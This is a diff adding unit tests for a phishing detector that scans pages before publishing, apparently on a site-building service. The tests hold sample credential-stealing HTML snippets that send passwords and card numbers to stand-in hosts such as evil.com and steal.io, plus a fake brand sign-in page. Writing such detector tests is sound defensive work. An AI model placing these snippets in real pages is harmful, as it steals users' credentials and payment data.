@@ -64,3 +64,20 @@ r = scanPage(page(`<input id="n">${S}>function calc(){return ${EV}n.value)}${SE}
 assert(r.block.length === 0, "a calculator using eval is not blocked");
 r = scanPage(page(`<h1>My Bakery</h1><p>Fresh bread every day.</p>`));
 assert(r.block.length === 0, "a normal page is not blocked");
+
+// Stricter phishing checks (phishing.js findCredentialLeak): refused at publish via scan.block
+{
+  const P = await import(R + "cloudflare-lib/phishing.js");
+  const leak = (h) => P.findCredentialLeak(h);
+  assert(leak(`<input type="password"><script>fetch("https://evil.com/x",{method:"POST",body:p.value})</script>`).includes("evil.com"), "password + fetch to another site is caught");
+  assert(leak(`<input type=password><script>x.open("POST","//steal.io/a")</script>`).includes("steal.io"), "password + XMLHttpRequest to another site is caught");
+  assert(leak(`<input name="cardNumber"><script>navigator.sendBeacon("https://cards.biz/c", v)</script>`).includes("card number"), "card number + sendBeacon is caught");
+  assert(leak(`<input type="password"><script>new Image().src="https://log.me/p?pw="+pw.value</script>`).includes("log.me"), "image beacon built from a value is caught");
+  assert(leak(`<title>Blackhole AI – Sign in</title><input type="password">`).includes("Blackhole AI"), "a fake Blackhole AI sign-in is caught");
+  assert(!leak(`<input type="password"><script>fetch("/api/x")</script>`), "fetching its own address is fine");
+  assert(!leak(`<script>fetch("https://api.weather.com/x")</script><input name="email">`), "calling an outside API without a password field is fine");
+  assert(!leak(`<title>My Gym</title><p>Made with Blackhole AI</p><input type="password">`), "a login demo that only mentions Blackhole AI in the text is fine");
+  assert(!leak(`<input type="password"><script>fetch("https://nova.blackhole-ai-tech.com/x")</script>`), "sending to a Blackhole AI address is fine");
+  const s = scanPage(`<input type="password"><script>fetch("https://evil.com/x")</script>`);
+  assert(s.flag === "red" && s.block.length === 1, "the scan flags it red and refuses publishing");
+}
